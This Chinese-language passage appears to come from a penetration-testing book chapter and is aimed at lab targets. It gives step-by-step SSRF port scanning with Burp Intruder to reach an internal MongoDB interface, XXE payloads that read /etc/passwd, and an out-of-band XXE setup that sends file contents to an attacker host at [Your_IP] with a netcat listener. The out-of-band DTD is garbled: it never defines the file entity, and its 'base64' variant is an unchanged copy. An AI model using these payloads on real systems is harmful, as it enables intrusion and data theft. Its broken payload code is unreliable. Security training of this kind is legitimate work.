### 优化后的文本

#### 服务器端请求伪造（SSRF）漏洞利用

我们知道应用程序正在监听3000端口。通过使用nmap扫描，我们发现外部没有其他Web端口在监听。那么，哪些服务仅对localhost开放呢？为了回答这个问题，我们需要遍历所有本地端口。我们可以借助Burp Suite和Intruder来实现这一目标。

1. 在Burp Suite中，切换到Proxy/HTTP History选项卡，找到之前的SSRF请求包。
2. 右键点击Request Body并将其发送给Intruder。
3. 转到Intruder选项卡，点击Clear按钮。
4. 突出显示端口号“3000”，然后点击Add。
5. 你的GET请求应如下所示：
   ```
   GET /ssrf?user=&comment=&link=http://127.0.0.1:§3000§ HTTP/1.1
   ```

6. 切换到Payloads选项卡，选择“Numbers”作为Payload类型。
7. 设置从28000到28100的端口范围，步长为1：
   - From: 28000
   - To: 28100
   - Step: 1
8. 点击Start Attack。

你将看到端口28017的响应长度远大于其他请求。打开浏览器并访问以下URL，以利用SSRF漏洞并访问MongoDB Web界面：
```
http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017
```

要访问特定资源，如`serverStatus`，请使用以下URL：
```
http://chat:3000/ssrf?user=&comment=&link=http://127.0.0.1:28017/serverStatus?text=1
```

**重要提示：**
- SSRF漏洞允许攻击者在基础设施内移动，可能导致严重的安全问题。
- 尽管SSRF不是新漏洞，但近年来其数量有所增加。

#### XML 外部实体攻击（XXE）

XML是一种可扩展标记语言，用于发送和存储易于阅读的数据。XML外部实体（XXE）攻击针对的是应用程序中的XML解析器。当允许XML解析且验证不当时，攻击者可能读取文件、导致拒绝服务或执行远程代码。

##### 普通XML文件 vs 恶意XML文件
```xml
普通 XML 文件
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE thp [
  <!ELEMENT thp ANY>
  <!ENTITY book "Universe">
]>
<thp>Hack The &book;</thp>

恶意 XML 文件
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE thp [
  <!ELEMENT thp ANY>
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<thp>Hack The &xxe;</thp>
```

##### XXE实验
1. 下载并启动专门用于XXE攻击的VMWare虚拟机：
   - 下载地址：[http://thehackerplaybook.com/get.php?type=XXE-vm](http://thehackerplaybook.com/get.php?type=XXE-vm)
2. 通过Burp Suite代理所有流量，访问虚拟机IP地址。
3. 拦截流量并点击Hack the XML。
4. 查看页面HTML源代码，找到POST请求提交的隐藏字段。
5. 修改POST参数“data”为以下内容：
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <!DOCTYPE thp [
     <!ELEMENT thp ANY>
     <!ENTITY xxe SYSTEM "file:///etc/passwd">
   ]>
   <thp>Hack The &xxe;</thp>
   ```
6. 发送修改后的请求，现在你应该能够读取`/etc/passwd`文件。

##### 高级XXE——带外数据协议（OOB）
如果无法直接查看响应或遇到字符限制，可以使用带外数据协议（OOB）进行XXE攻击。以下是步骤：

1. 使用篡改后的XXE XML攻击。
2. 易受攻击的XML解析器从攻击者服务器抓取DTD文件。
3. DTD文件包含读取`/etc/passwd`文件的代码。
4. DTD文件还包含隐秘传输`/etc/passwd`内容的代码（可能是经过编码的）。

设置攻击者机器和XXE-OOB payload：
- 创建名为`payload.dtd`的文件，并托管在攻击者服务器上：
  ```xml
  <!ENTITY % dtd SYSTEM "http://[Your_IP]/payload.dtd">
  <!ENTITY % all "<!ENTITY send SYSTEM 'http://[Your_IP]:8888/?data=%file;'>">
  %dtd;
  %all;
  ```
- 启动Web服务器托管DTD文件并设置NetCat监听器：
  ```sh
  nc -l -p 8888
  ```

若遇到解析错误，可以使用PHP输入输出流进行base64编码：
- 修改`payload.dtd`文件：
  ```xml
  <!ENTITY % dtd SYSTEM "http://[Your_IP]/payload.dtd">
  <!ENTITY % all "<!ENTITY send SYSTEM 'http://[Your_IP]:8888/?data=%file;'>">
  %dtd;
  %all;
  ```

重新启动NetCat监听器并重放请求，可以看到受害者服务器获取并运行了`payload.dtd`文件，NetCat处理程序接收并解码请求。

#### 本章总结
虽然这只是网络攻击的一部分，但希望这些案例能让你了解现代框架（如Node.js）如何引入旧的和新的攻击。许多常见的应用程序漏洞扫描器可能会错过这些复杂的漏洞，因为它们依赖于特定的语言或框架。因此，为了进行全面的渗透测试，你需要深入了解相关语言和框架。

#### 第4章 带球——开始攻击网络
在风险评估项目的第二天，你使用nmap扫描了目标的整个网段，并启动了漏洞扫描器，但未发现任何Web应用程序的初始入口点。这让你感到有些挫败，需要重新回顾之前收集的信息。一旦进入目标网络，你可以使用多种技巧获取更多凭证、在域中漫游、利用AD特性，最终找到所需信息。然而，这并不容易，因为你需要绕过防火墙、欺骗管理员并清除痕迹。